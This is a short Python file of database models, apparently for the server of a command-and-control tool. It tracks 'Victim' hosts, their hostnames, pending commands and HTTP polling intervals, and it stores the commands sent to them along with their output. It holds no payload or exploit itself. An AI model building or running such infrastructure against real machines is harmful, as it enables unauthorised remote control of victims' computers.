from app import db
from base64 import b64decode as dec


class Victim(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    hostname = db.Column(db.String)
    currentcmd = db.Column(db.String, default="hold")
    delta = db.Column(db.Integer, default=4) # time in seconds before doing http request
    def getInfo(self):
        return {"id": self.id, "hostname":self.hostname, "currentcmd":self.currentcmd, "delta":self.delta} 


class Cmd(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    str = db.Column(db.String)
    output = db.Column(db.String)
    victimid = db.Column(db.Integer, foreign_key=True)
    
    def get(self):
        return {"cmd":self.str, "output":self.output}